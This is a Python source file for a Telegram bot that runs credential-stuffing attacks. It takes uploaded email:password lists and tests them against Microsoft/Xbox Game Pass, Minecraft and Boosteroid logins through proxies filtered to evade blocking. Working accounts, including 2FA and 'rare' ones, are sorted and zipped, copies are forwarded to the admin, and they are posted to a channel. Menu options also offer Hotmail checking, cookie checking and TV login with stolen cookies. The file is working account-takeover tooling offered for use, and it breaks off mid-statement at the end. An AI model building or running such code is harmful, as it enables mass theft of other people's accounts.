import io
import os
import time
import random
import zipfile
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from HOME import state
from HOME.helpers import (
    bold, italic, mono, pre,
    E_FILE, E_CHART, E_CHECK, E_CROSS, E_BOLT, E_GLOBE, E_GEAR, E_MEMO,
    E_WARN, E_HOURGLASS, E_BAN, E_STOP, E_PLAY, E_PIN, E_FIRE, E_USER,
    E_SEARCH, E_INFO, E_TV, make_progress_bar
)
from HOME.session import CheckerSession
from HOME.runner import run_checker
from HOME.results import build_hits_text
from DATABASE.database import (load_db, update_user_info, is_banned, is_approved,
    bump_user_stats, check_daily_limit, consume_daily_file, DAILY_FILE_LIMIT)
from PROXY.proxy import init_proxies
from API.checker_engine import parse_combos
from CONFIG.config import ADMIN_ID, MAX_LINES, MAX_FILE_SIZE_MB, MASTER_THREADS, DEFAULT_THREADS
try:
    from CONFIG.config import HITS_CHANNEL_ID
except ImportError:
    HITS_CHANNEL_ID = 0

_COOKIE_FILE_SIZE_MB = 10  # quota for cookie checker


def _combo_progress_bar(done: int, total: int, length: int = 10) -> str:
    pct = min(done / total, 1.0) if total else 0
    filled = int(length * pct)
    return "▰" * filled + "▱" * (length - filled) + f" {int(pct * 100)}%"


def _px_str_to_dict(p):
    if not p:
        return None
    try:
        if p.startswith("socks5://") or p.startswith("socks5h://") or p.startswith("socks4://"):
            return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = p if p.startswith("http") or p.startswith("socks") else f"http://{p}"
        return {"http": url, "https": url}
    except Exception:
        return None


def _run_combo_check(bot, user, loading_msg, file_content: bytes, fname: str, mode: str):
    """Run Minecraft / Boosteroid combo check with live progress and hits delivery."""
    from API.minecraft_checker import MinecraftChecker, format_hit_minecraft
    from API.boosteroid_combo import check_boosteroid_combo, format_hit_boosteroid_combo

    uid = user.id
    chat_id = loading_msg.chat.id
    msg_id = loading_msg.message_id
    title = "💎 Xbox Game Pass" if mode == "minecraft" else "☁️ Boosteroid"

    # ── #10 Multi-file queue — busy ho to queue mein daalo ──
    with state.active_checks_lock:
        if state.active_checks.get(f"combo_busy_{uid}"):
            state.active_checks.setdefault(f"combo_queue_{uid}", []).append(
                (file_content, fname, mode))
            qn = len(state.active_checks[f"combo_queue_{uid}"])
            try:
                bot.send_message(chat_id,
                    f"{E_HOURGLASS} {bold(f'Queued #{qn}')} — {mono(fname)}\n"
                    f"{E_MEMO} Current check khatam hote hi auto-start hoga.",
                    parse_mode="HTML")
            except Exception:
                pass
            return
        state.active_checks[f"combo_busy_{uid}"] = True

    # Parse combos
    lines = file_content.decode("utf-8", errors="ignore").splitlines()
    combos, skipped = [], 0
    for ln in lines:
        ln = ln.strip()
        if not ln or ":" not in ln:
            skipped += 1
            continue
        em, pw = ln.split(":", 1)
        em, pw = em.strip(), pw.strip()
        if em and pw:
            combos.append((em, pw))
        else:
            skipped += 1

    total = len(combos)
    if total == 0:
        try:
            bot.edit_message_text(
                f"{E_CROSS} {bold('No valid combos found!')}\n"
                f"{E_MEMO} Format: {mono('email:password')} (one per line)",
                chat_id, msg_id, parse_mode="HTML"
            )
        except Exception:
            pass
        return

    proxies = init_proxies()

    # ── Pre-test: use only live proxies (91% errors fix) ──
    def _filter_live_proxies(raw_list, sample_cap=80, timeout=5, max_workers=30, test_url=None):
        """Sample-test proxies against the REAL target site (Microsoft/Boosteroid) —
        ipify pe pass hone se Microsoft unblock nahi hota. Keep only target-working proxies."""
        import random as _r, requests as _rq
        from concurrent.futures import ThreadPoolExecutor as _TPE
        if not raw_list:
            return raw_list, 0
        sample = _r.sample(raw_list, min(sample_cap, len(raw_list)))

        # Default: Microsoft sFTTag page (Xbox checker ka real target)
        if not test_url:
            test_url = ("https://login.live.com/oauth20_authorize.srf?"
                        "client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&"
                        "scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en")

        def _test(raw):
            try:
                parts = raw.split(":")
                if len(parts) == 4:
                    url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif len(parts) == 2:
                    url = f"http://{parts[0]}:{parts[1]}"
                else:
                    url = raw if raw.startswith(("http", "socks")) else f"http://{raw}"
                resp = _rq.get(test_url, proxies={"http": url, "https": url},
                               timeout=timeout, verify=False,
                               headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
                if resp.status_code == 200 and len(resp.text) > 500:
                    return raw
            except Exception:
                pass
            return None

        alive = []
        with _TPE(max_workers=max_workers) as _ex:
            for res in _ex.map(_test, sample):
                if res:
                    alive.append(res)
        return (alive if alive else raw_list), len(alive)
    # ── Proxyless mode (Xbox) — user ne direct IP choose kiya ──
    proxyless = False
    if mode == "minecraft":
        with state.active_checks_lock:
            proxyless = state.active_checks.pop(f"mc_px_{uid}", True) is False
    if proxyless:
        proxies = []

    # Pre-test proxies — use only live ones
    if proxies:
        try:
            bot.edit_message_text(
                f"{E_HOURGLASS} {bold('Testing proxies...')} {italic('only live proxies will be used')}",
                chat_id, msg_id, parse_mode="HTML"
            )
        except Exception:
            pass
        _test_url = None if mode == "minecraft" else "https://cloud.boosteroid.com/"
        proxies, alive_n = _filter_live_proxies(proxies, test_url=_test_url)
        try:
            bot.edit_message_text(
                f"{E_CHECK} {bold(f'{alive_n} Microsoft-ready proxies')} {italic('— starting check...')}" if mode == "minecraft" else
                f"{E_CHECK} {bold(f'{alive_n} live proxies ready')} {italic('— starting check...')}",
                chat_id, msg_id, parse_mode="HTML"
            )
        except Exception:
            pass

    mc = MinecraftChecker() if mode == "minecraft" else None

    # ── #2 Hit filter (Xbox only): all / xgp / mc ──
    mc_filter = "all"
    if mode == "minecraft":
        with state.active_checks_lock:
            mc_filter = state.active_checks.pop(f"mc_filter_{uid}", "all") or "all"

    stats = {"done": 0, "hits": 0, "bad": 0, "error": 0, "twofa": 0, "valid": 0, "retried": 0}
    error_combos = []  # error wale combos — end mein auto-recheck
    hits = []  # premium hits (Game Pass / Minecraft Premium)
    valid_hits = []  # valid accounts without subscription — shown separately
    rare_hits = []  # #6 rare accounts (Minecon capes / 10+ year tenure)
    twofa_hits = []  # 2FA accounts — valid logins, saved separately
    lock = threading.Lock()
    stop_flag = threading.Event()
    start_ts = time.time()

    with state.active_checks_lock:
        state.active_checks[f"combo_run_{uid}"] = stop_flag

    stop_markup = types.InlineKeyboardMarkup()
    stop_markup.add(types.InlineKeyboardButton(f"{E_STOP} Stop", callback_data=f"combo_stop_{uid}"))

    def _status_text():
        elapsed = int(time.time() - start_ts)
        speed = stats["done"] / elapsed if elapsed > 0 else 0
        eta = int((total - stats["done"]) / speed) if speed > 0 else 0
        twofa_row = (f"\n🔐 2FA <code>{stats['twofa']}</code>" if mode == "minecraft" else "")
        return (
            f"<blockquote>╭─────────────────────╮\n      {title} 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n╰─────────────────────╯</blockquote>\n\n"
            f"<blockquote>\n"
            f"{E_CHART} <b>PROGRESS</b>\n"
            f"{_combo_progress_bar(stats['done'], total)}\n"
            f"{mono(str(stats['done']))}/{mono(str(total))}  •  {E_BOLT} {mono(f'{speed:.1f}/s')}  •  ETA {mono(f'{eta}s')}\n"
            f"{'┄' * 22}\n"
            f"{E_FIRE} Hits <code>{stats['hits']}</code>  •  ✅ Valid <code>{stats['valid']}</code>\n"
            f"{E_CROSS} Bad <code>{stats['bad']}</code>  •  {E_WARN} Err <code>{stats['error']}</code>"
            + twofa_row
            + f"\n</blockquote>\n"
            f"{E_GEAR} {italic('WHITE Master • Dev: @ADI_WT')}"
        )

    try:
        bot.edit_message_text(_status_text(), chat_id, msg_id,
                              parse_mode="HTML", reply_markup=stop_markup)
    except Exception:
        pass

    def _progress_updater():
        while not stop_flag.is_set() and stats["done"] < total:
            time.sleep(4)
            try:
                bot.edit_message_text(_status_text(), chat_id, msg_id,
                                      parse_mode="HTML", reply_markup=stop_markup)
            except Exception:
                pass

    threading.Thread(target=_progress_updater, daemon=True).start()

    def _check_one(email, pwd):
        if stop_flag.is_set():
            return
        try:
            if mode == "minecraft":
                status, info = mc.check_account(email, pwd, proxies)
                with lock:
                    stats["done"] += 1
                    if status == "HIT" and info:
                        keep = True
                        if mc_filter == "xgp" and not info.get("has_xgp"):
                            keep = False
                        elif mc_filter == "mc" and info.get("type") != "Minecraft Premium":
                            keep = False
                        if str(info.get("type", "")).startswith("Valid Login") or not keep:
                            stats["valid"] += 1
                            valid_hits.append(f"{email}:{pwd}")
                        else:
                            stats["hits"] += 1
                            hit_content, hit_fname = format_hit_minecraft(info, source=fname)
                            hits.append((hit_content, hit_fname))

                            # ── #19 Instant XGPU alert — zip ka wait nahi ──
                            if info.get("xgp") == "XGPU":
                                try:
                                    bot.send_message(
                                        chat_id,
                                        f"💎💎 {bold('XGPU HIT!')}\n"
                                        f"{E_MEMO} {mono(info.get('email', '?'))}\n"
                                        f"🎮 {mono(info.get('gamertag', 'N/A'))} • 🌍 {mono(info.get('region', 'N/A'))} • ⏰ {mono(info.get('xgp_expiry', 'N/A'))}",
                                        parse_mode="HTML"
                                    )
                                except Exception:
                                    pass

                            # ── #6 Rare account detector — Minecon capes / 10+ yr tenure ──
                            try:
                                _rare_caps = [c for c in (info.get("cape_names") or []) if "minecon" in str(c).lower()]
                                _tenure = int(info.get("tenure") or 0) if str(info.get("tenure") or "0").isdigit() else 0
                                if _rare_caps or _tenure >= 10:
                                    reasons = []
                                    if _rare_caps:
                                        reasons.append("Capes: " + ", ".join(_rare_caps))
                                    if _tenure >= 10:
                                        reasons.append(f"Tenure: {_tenure}y")
                                    rare_hits.append(f"{email}:{pwd}  |  {' | '.join(reasons)}")
                                    bot.send_message(
                                        chat_id,
                                        f"💎💎💎 {bold('RARE ACCOUNT!')}\n"
                                        f"{E_MEMO} {mono(email)}\n"
                                        f"🏆 {' | '.join(reasons)}",
                                        parse_mode="HTML"
                                    )
                            except Exception:
                                pass
                    elif status == "2FA":
                        stats["twofa"] += 1
                        twofa_hits.append(f"{email}:{pwd}")
                    elif status == "BAD":
                        stats["bad"] += 1
                    else:
                        stats["error"] += 1
                        error_combos.append((email, pwd))
            else:
                # Retry up to 3 times with a fresh proxy — free proxies die often
                status, info = "ERROR", None
                for _try in range(3 if proxies else 1):
                    px = _px_str_to_dict(random.choice(proxies)) if proxies else None
                    status, info = check_boosteroid_combo(email, pwd, proxy=px)
                    if status != "ERROR":
                        break
                with lock:
                    stats["done"] += 1
                    if status == "HIT" and info:
                        if info.get("is_premium"):
                            stats["hits"] += 1
                            hits.append(format_hit_boosteroid_combo(info, source=fname))
                        else:
                            stats["valid"] += 1
                            valid_hits.append(f"{email}:{pwd}")
                    elif status == "BAD":
                        stats["bad"] += 1
                    else:
                        stats["error"] += 1
                        error_combos.append((email, pwd))
        except Exception:
            with lock:
                stats["done"] += 1
                stats["error"] += 1
                error_combos.append((email, pwd))

    workers = 15 if mode == "boosteroid" else 20
    if mode == "minecraft":
        with state.active_checks_lock:
            workers = state.active_checks.pop(f"mc_threads_{uid}", None) or workers
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(_check_one, em, pw) for em, pw in combos]
        for f in as_completed(futs):
            if stop_flag.is_set():
                for fu in futs:
                    fu.cancel()
                break
            try:
                f.result()
            except Exception:
                pass

    # ── #4 Auto-retry: error combos ko ek baar aur check (fresh proxies) ──
    if error_combos and not stop_flag.is_set():
        retry_list = error_combos[:]
        error_combos.clear()
        stats["retried"] = len(retry_list)
        try:
            bot.edit_message_text(
                _status_text() + f"\n\n{E_HOURGLASS} {italic(f'Auto-retrying {len(retry_list)} error combos...')}",
                chat_id, msg_id, parse_mode="HTML", reply_markup=stop_markup
            )
        except Exception:
            pass
        # retry ke errors ko done count se adjust (double count na ho)
        with lock:
            stats["done"] -= len(retry_list)
            stats["error"] -= len(retry_list)
        with ThreadPoolExecutor(max_workers=max(5, workers // 2)) as ex:
            futs = [ex.submit(_check_one, em, pw) for em, pw in retry_list]
            for f in as_completed(futs):
                if stop_flag.is_set():
                    for fu in futs:
                        fu.cancel()
                    break
                try:
                    f.result()
                except Exception:
                    pass

    # ── #12 user activity stats ──
    try:
        bump_user_stats(load_db(), uid, files=1, lines=total, hits=len(hits))
    except Exception:
        pass

    # ── #10 queue: agla file auto-start ──
    with state.active_checks_lock:
        queue = state.active_checks.get(f"combo_queue_{uid}", [])
    if queue and not stop_flag.is_set():
        with state.active_checks_lock:
            nxt = queue.pop(0)
            state.active_checks[f"combo_queue_{uid}"] = queue
            state.active_checks.pop(f"combo_busy_{uid}", None)
        try:
            bot.send_message(chat_id,
                f"{E_PLAY} {bold('Starting queued file:')} {mono(nxt[1])}",
                parse_mode="HTML")
        except Exception:
            pass
        threading.Thread(target=_run_combo_check,
                         args=(bot, user, loading_msg, nxt[0], nxt[1], nxt[2]),
                         daemon=True).start()
    else:
        with state.active_checks_lock:
            state.active_checks.pop(f"combo_busy_{uid}", None)

    stopped = stop_flag.is_set()
    with state.active_checks_lock:
        state.active_checks.pop(f"combo_run_{uid}", None)
        state.active_checks.pop(f"file_{uid}", None)

    elapsed = int(time.time() - start_ts)
    summary = (
        f"<blockquote>╭─────────────────────╮\n      🏁 {'𝗦𝗧𝗢𝗣𝗣𝗘𝗗' if stopped else '𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘'}\n╰─────────────────────╯</blockquote>\n\n"
        f"<blockquote>\n"
        f"{E_PIN} <b>{title}</b>" + (" 🚫 Proxyless" if proxyless else "") + "\n"
        f"{'┄' * 22}\n"
        f"{_combo_progress_bar(stats['done'], total)}\n"
        f"{E_CHART} Checked <code>{stats['done']}</code>/<code>{total}</code>  •  {E_HOURGLASS} <code>{elapsed}s</code>  •  {E_BOLT} <code>{int(stats['done'] / elapsed * 60) if elapsed > 0 else 0} CPM</code>\n"
        f"{'┄' * 22}\n"
        f"{E_FIRE} <b>Hits: <code>{stats['hits']}</code></b>\n"
        f"{E_CROSS} Bad <code>{stats['bad']}</code>  •  {E_WARN} Errors <code>{stats['error']}</code>"
        + f"\n✅ <b>Valid Accounts: <code>{stats['valid']}</code></b>"
        + (f"  •  🔁 Retried <code>{stats['retried']}</code>" if stats['retried'] else "")
        + (f"  •  2FA <code>{stats['twofa']}</code>" if mode == "minecraft" else "")
        + (f"\n🏆 <b>Rare: <code>{len(rare_hits)}</code></b>" if rare_hits else "")
        + f"\n</blockquote>\n"
        f"{E_GEAR} {italic('WHITE Master • Dev: @ADI_WT')}"
    )
    try:
        bot.edit_message_text(summary, chat_id, msg_id, parse_mode="HTML")
    except Exception:
        pass

    if hits or valid_hits or twofa_hits or rare_hits:
        tmpdir = tempfile.mkdtemp(prefix=f"combo_{mode}_")
        zip_path = os.path.join(tmpdir, f"{mode}_hits_{int(time.time())}.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for content, hname in hits:
                    zf.writestr(hname, content)
                if valid_hits:
                    zf.writestr("valid_accounts.txt", "\n".join(valid_hits) + "\n")
                if rare_hits:
                    zf.writestr("RARE_ACCOUNTS.txt", "\n".join(rare_hits) + "\n")
                if twofa_hits:
                    zf.writestr("2fa_valid.txt", "\n".join(twofa_hits) + "\n")
            # ── #20 Auto-split: send 45MB+ zip in parts ──
            MAX_PART = 45 * 1024 * 1024
            if os.path.getsize(zip_path) > MAX_PART:
                part_files = []
                with zipfile.ZipFile(zip_path, "r") as zsrc:
                    names = zsrc.namelist()
                    part_no, cur_size = 1, 0
                    cur_path = os.path.join(tmpdir, f"part{part_no}.zip")
                    zout = zipfile.ZipFile(cur_path, "w", zipfile.ZIP_DEFLATED)
                    for nm in names:
                        data = zsrc.read(nm)
                        if cur_size + len(data) > MAX_PART:
                            zout.close()
                            part_files.append(cur_path)
                            part_no += 1
                            cur_path = os.path.join(tmpdir, f"part{part_no}.zip")
                            zout = zipfile.ZipFile(cur_path, "w", zipfile.ZIP_DEFLATED)
                            cur_size = 0
                        zout.writestr(nm, data)
                        cur_size += len(data)
                    zout.close()
                    part_files.append(cur_path)
                for i, pf in enumerate(part_files, 1):
                    with open(pf, "rb") as fh:
                        bot.send_document(chat_id, fh,
                            caption=f"{E_FIRE} {bold(f'{len(hits)} Hits — Part {i}/{len(part_files)}')} | {italic('Dev: @ADI_WT')}",
                            parse_mode="HTML")
            else:
                with open(zip_path, "rb") as fh:
                    bot.send_document(
                        chat_id, fh,
                        caption=(f"{E_FIRE} {bold(f'{len(hits)} Hits')}"
                             + (f" • ✅ {len(valid_hits)} Valid" if valid_hits else "")
                             + (f" • 🔐 {len(twofa_hits)} 2FA" if twofa_hits else "")
                             + f" | {italic('Dev: @ADI_WT')}"),
                    parse_mode="HTML"
                )
            # ── Forward a copy of ALL hits to admin ──
            if user.id != ADMIN_ID:
                try:
                    user_profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
                    user_name = ((user.first_name or "") + " " + (user.last_name or "")).strip() or "User"
                    admin_caption = (
                        f"{E_FIRE} {bold(f'{title} — {len(hits)} Hits')}\n"
                        f"{E_USER} Checked by: <a href=\"{user_profile_link}\">{user_name}</a>\n"
                        f"{E_PIN} User ID: {mono(str(user.id))}\n"
                        f"{E_CHART} Checked: {mono(str(stats['done']))}/{mono(str(total))} | "
                        f"Valid: {mono(str(stats['valid']))} | Bad: {mono(str(stats['bad']))} | Errors: {mono(str(stats['error']))}\n"
                        f"{E_GEAR} {italic('Dev: @ADI_WT')}"
                    )
                    with open(zip_path, "rb") as fh2:
                        bot.send_document(ADMIN_ID, fh2, caption=admin_caption, parse_mode="HTML")
                except Exception:
                    pass
            # ── #5 Channel auto-post ──
            if HITS_CHANNEL_ID:
                try:
                    chan_cap = (f"{E_FIRE} {bold(f'{title} — {len(hits)} Hits')}"
                                + (f" • ✅ {len(valid_hits)} Valid" if valid_hits else "")
                                + (f" • 🔐 {len(twofa_hits)} 2FA" if twofa_hits else "")
                                + f"\n{E_GEAR} {italic('WHITE Master')}")
                    with open(zip_path, "rb") as fh3:
                        bot.send_document(HITS_CHANNEL_ID, fh3, caption=chan_cap, parse_mode="HTML")
                except Exception:
                    pass
        except Exception:
            pass
    else:
        try:
            bot.send_message(chat_id, f"{E_INFO} {bold('No hits found in this file.')}", parse_mode="HTML")
        except Exception:
            pass


def cb_mode_main(call):
    """Xbox/combo menus se wapas main menu pe — start.py ke back_to_menu handler ko route karta hai."""
    call.data = "back_to_menu"
    try:
        state.bot.process_new_callback_query([call])
    except Exception:
        pass


def _answer(bot, call_id, text=None, alert=False):
    try:
        bot.answer_callback_query(call_id, text=text, show_alert=alert)
    except:
        pass


def register():
    bot = state.bot

    @bot.message_handler(content_types=['document'])
    def handle_document(message):
        user = message.from_user
        db_inst = load_db()
        update_user_info(db_inst, user)

        banned, reason = is_banned(db_inst, user.id)
        if banned:
            bot.reply_to(message, f"{E_BAN} {bold('You are banned!')}\n{E_MEMO} Reason: {mono(reason)}", parse_mode="HTML")
            return

        # ── PRIVATE BOT gate — no file check without approval ──
        if user.id != ADMIN_ID and not is_approved(db_inst, user.id):
            bot.reply_to(
                message,
                f"{E_WARN} {bold('Access Required')}\n"
                f"{E_MEMO} This is a private bot — first press /start and get admin approval.",
                parse_mode="HTML"
            )
            return

        # ── #15 Daily limit gate (admin unlimited) ──
        if user.id != ADMIN_ID:
            allowed, remaining = check_daily_limit(db_inst, user.id)
            if not allowed:
                bot.reply_to(
                    message,
                    f"{E_WARN} {bold('Daily Limit Reached!')}\n"
                    f"{E_MEMO} Free users can check {mono(str(DAILY_FILE_LIMIT))} files/day. Come back tomorrow!",
                    parse_mode="HTML"
                )
                return
            consume_daily_file(db_inst, user.id)

        doc = message.document
        fname = doc.file_name or ""
        is_txt = fname.lower().endswith('.txt')
        is_zip = fname.lower().endswith('.zip')

        if not is_txt and not is_zip:
            bot.reply_to(message, f"{E_CROSS} {bold('Only .txt or .zip files are supported!')}", parse_mode="HTML")
            return

        # Size check
        max_bytes = max(MAX_FILE_SIZE_MB, _COOKIE_FILE_SIZE_MB) * 1024 * 1024
        if doc.file_size > max_bytes:
            bot.reply_to(
                message,
                f"{E_CROSS} {bold('You are allowed 10MB in your current quota')}\n"
                f"{E_MEMO} File size: {mono(f'{doc.file_size/1024/1024:.1f} MB')}",
                parse_mode="HTML"
            )
            return

        is_admin = user.id == ADMIN_ID
        with state.active_checks_lock:
            has_ms = user.id in state.active_checks and not is_admin
            has_ck = f"ck_{user.id}" in state.active_checks and not is_admin
            if has_ms or has_ck:
                bot.reply_to(message, f"{E_WARN} {bold('You already have an active check running!')}\n{E_MEMO} use /stop", parse_mode="HTML")
                return

        loading_msg = bot.reply_to(message, f"{E_HOURGLASS} {bold('Loading file...')} {E_GEAR}", parse_mode="HTML")

        try:
            file_info = bot.get_file(doc.file_id)
            file_content = bot.download_file(file_info.file_path)
        except Exception as e:
            bot.edit_message_text(f"{E_CROSS} Error reading file: {mono(str(e))}", loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML")
            return

        # Store raw file bytes for later use by either mode
        with state.active_checks_lock:
            state.active_checks[f"file_{user.id}"] = {
                "content": file_content,
                "filename": fname,
                "size": doc.file_size,
                "message": message,
                "is_txt": is_txt,
                "is_zip": is_zip,
            }

        # ── TV cookies upload mode — save file to folder ──
        with state.active_checks_lock:
            tv_folder = state.active_checks.pop(f"tv_up_{user.id}", None)

        if tv_folder:
            if is_zip:
                bot.edit_message_text(
                    f"{E_CROSS} {bold('Please send a .txt file only (no ZIP)!')}",
                    loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML"
                )
                return
            import pathlib
            folder_path = pathlib.Path(tv_folder)
            folder_path.mkdir(exist_ok=True)
            safe_name = os.path.basename(fname).replace("/", "_") or "cookies.txt"
            (folder_path / safe_name).write_bytes(file_content)
            with state.active_checks_lock:
                state.active_checks.pop(f"file_{user.id}", None)
            count = len([f for f in folder_path.iterdir() if f.is_file()])
            bot.edit_message_text(
                f"{E_CHECK} {bold('Cookies Saved!')}\n"
                f"{E_FILE} File: {mono(safe_name)}\n"
                f"📁 Folder: {mono(tv_folder + '/')}\n"
                f"📊 Total cookie files: {mono(str(count))}\n\n"
                f"{E_INFO} Now send the TV code — the bot will activate using this account.",
                loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML"
            )
            return

        # ── Combo mode (Minecraft / Boosteroid) — user came from Xbox menu ──
        with state.active_checks_lock:
            combo_mode = state.active_checks.pop(f"combo_mode_{user.id}", None)

        if combo_mode:
            if is_zip:
                bot.edit_message_text(
                    f"{E_CROSS} {bold('Please send a .txt file only for the combo checker!')}",
                    loading_msg.chat.id, loading_msg.message_id, parse_mode="HTML"
                )
                return
            threading.Thread(
                target=_run_combo_check,
                args=(bot, user, loading_msg, file_content, fname, combo_mode),
                daemon=True
            ).start()
            return

        # Show mode selection
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📧 M-HOTMAIL", callback_data=f"mode_hotmail_{user.id}"),
            types.InlineKeyboardButton("🍪 Cookies",   callback_data=f"mode_cookies_{user.id}"),
        )
        markup.add(
            types.InlineKeyboardButton("📬 Inboxer",  callback_data=f"mode_inboxer_{user.id}"),
            types.InlineKeyboardButton("❌ Exit",      callback_data=f"mode_exit_{user.id}"),
        )
        markup.add(
            types.InlineKeyboardButton("💎 Xbox Game Pass Combo", callback_data=f"mode_mccombo_{user.id}"),
            types.InlineKeyboardButton("☁️ Boosteroid Combo", callback_data=f"mode_boostcombo_{user.id}"),
        )
        markup.add(
            types.InlineKeyboardButton("📺 TV Login (Cookies)", callback_data=f"mode_tvlogin_{user.id}"),
        )

        bot.edit_message_text(
            f"{E_FILE} {bold('File received')}\n"
            f"{E_MEMO} Name: {mono(fname)}\n"
            f"{E_CHART} Size: {mono(f'{doc.file_size/1024:.1f} KB')}\n\n"
            f"Choose checker mode:",
            loading_msg.chat.id, loading_msg.message_id,
            parse_mode="HTML", reply_markup=markup
        )

    # ── M-HOTMAIL mode ────────────────────────────────────────────────────────
    @bot.callback_query_handler(func=lambda call: call.data.startswith("mode_hotmail_"))
    def cb_mode_hotmail(call):
        uid = int(call.data.split("_")[-1])
        if call.from_user.id != uid:
            _answer(bot, call.id, "Not your session!", alert=True)
            return

        # ── Answer callback IMMEDIATELY — stops Telegram from resending it ──
        _answer(bot, call.id)

        with state.active_checks_lock:
            fd = state.active_checks.get(f"file_{uid}")
            # Guard: if already parsing this uid, ignore duplicate callback
            if f"parsing_{uid}" in state.active_checks:
                return
            if not fd:
                return
            if fd.get("is_zip"):
                return
            # Mark as parsing to block any duplicate triggers
            state.active_checks[f"parsing_{uid}"] = True

        try:
            bot.edit_message_text(
                f"{E_HOURGLASS} {bold('Parsing combos...')} {E_GEAR}",
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                parse_mode="HTML"
            )
        except Exception:
            pass

        def do_parse():
            try:
                db_inst = load_db()
                is_admin = call.from_user.id == ADMIN_ID
                lines = fd["content"].decode("utf-8", errors="ignore").splitlines()
                combos, total_lines, bad_lines = parse_combos(lines)
                valid = len(combos)
                approved = is_approved(db_inst, uid) or is_admin
                over_limit = not approved and total_lines > MAX_LINES

                sep = "\u2501" * 20
                summary_text = (
                    f"{E_FILE} {bold('File Summary')}\n"
                    f"{sep}\n"
                    f"{E_MEMO} File: {mono(fd['filename'])}\n"
                    f"{E_CHART} Total Lines: {mono(str(total_lines))}\n"
                    f"{E_CHECK} Valid Combos: {mono(str(valid))}\n"
                    f"{E_CROSS} Invalid/Skipped: {mono(str(bad_lines))}\n"
                    f"{E_BOLT} Threads: {mono(str(MASTER_THREADS))}\n"
                    f"{E_GLOBE} Proxies: {mono(str(len(init_proxies())))}\n"
                    f"{sep}"
                )

                if over_limit:
                    summary_text += (
                        f"\n{E_WARN} {bold(f'More than {MAX_LINES} lines!')}\n"
                        f"{E_MEMO} Only first {MAX_LINES} will be processed."
                    )
                    combos = combos[:MAX_LINES]
                    valid = len(combos)
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    markup.add(
                        types.InlineKeyboardButton(f"{E_PLAY} Proceed (First {MAX_LINES})", callback_data=f"proceed_check_{uid}"),
                        types.InlineKeyboardButton(f"{E_STOP} Abort", callback_data=f"abort_check_{uid}")
                    )
                else:
                    if valid == 0:
                        try:
                            bot.edit_message_text(
                                f"{E_CROSS} {bold('No valid combos found!')}",
                                call.message.chat.id, call.message.message_id, parse_mode="HTML"
                            )
                        except Exception:
                            pass
                        return
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    markup.add(
                        types.InlineKeyboardButton(f"{E_PLAY} Start Checking", callback_data=f"proceed_check_{uid}"),
                        types.InlineKeyboardButton(f"{E_STOP} Abort", callback_data=f"abort_check_{uid}")
                    )

                summary_text += f"\n{E_GEAR} {italic('Dev: @ADI_WT')}"
                try:
                    bot.edit_message_text(
                        summary_text, call.message.chat.id, call.message.message_id,
                        parse_mode="HTML", reply_markup=markup
                    )
                except Exception:
                    pass

                with state.active_checks_lock:
                    state.active_checks[f"pending_{uid}"] = {
                        "combos": combos,
                        "total_lines": total_lines,
                        "bad_lines": bad_lines,
                        "message": fd["message"],
                        "loading_msg_id": call.message.message_id,
                    }
            finally:
                # Always release the parsing guard
                with state.active_checks_lock:
                    state.active_checks.pop(f"parsing_{uid}", None)

        threading.Thread(target=do_parse, daemon=True).start()

    @bot.callback_query_handler(func=lambda call: call.data.startswith("proceed_check_"))
    def cb_proceed_check(call):
        user = call.from_user
        uid = int(call.data.split("_")[-1])
        if user.id != uid:
            _answer(bot, call.id, "Not your check!", alert=True)
            return

        with state.active_checks_lock:
            pending_key = f"pending_{uid}"
            if pending_key not in state.active_checks:
                _answer(bot, call.id, "No pending check found!", alert=True)
                return
            if uid in state.active_checks:
                _answer(bot, call.id, "Already checking!", alert=True)
                return
            pending = state.active_checks.pop(pending_key)

        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

        cs = CheckerSession(uid, pending["combos"], pending["total_lines"], pending["bad_lines"])
        with state.active_checks_lock:
            state.active_checks[uid] = cs

        threading.Thread(target=run_checker, args=(cs, pending["message"], call.from_user), daemon=True).start()
        _answer(bot, call.id, f"Checking started! {MASTER_THREADS} threads")

    @bot.callback_query_handler(func=lambda call: call.data.startswith("abort_check_"))
    def cb_abort_check(call):
        user = call.from_user
        uid = int(call.data.split("_")[-1])
        if user.id != uid:
            _answer(bot, call.id, "Not your check!", alert=True)
            return

        with state.active_checks_lock:
            pending_key = f"pending_{uid}"
            if pending_key in state.active_checks:
                del state.active_checks[pending_key]

        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

        bot.send_message(call.message.chat.id, f"{E_STOP} {bold('Check aborted!')}\n{E_GEAR} {italic('Dev: @ADI_WT')}", parse_mode="HTML")
        _answer(bot, call.id)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("get_hits_"))
    def cb_get_hits(call):
        user = call.from_user
        uid = int(call.data.split("_")[-1])
        if user.id != uid:
            _answer(bot, call.id, "Not your check!", alert=True)
            return

        with state.active_checks_lock:
            cs = state.active_checks.get(uid)

        if not cs:
            _answer(bot, call.id, "No active check found!", alert=True)
            return

        hits_text = build_hits_text(cs)
        if len(hits_text) > 4000:
            try:
                f = io.BytesIO(hits_text.encode("utf-8"))
                f.name = "current_hits.txt"
                bot.send_document(call.message.chat.id, f,
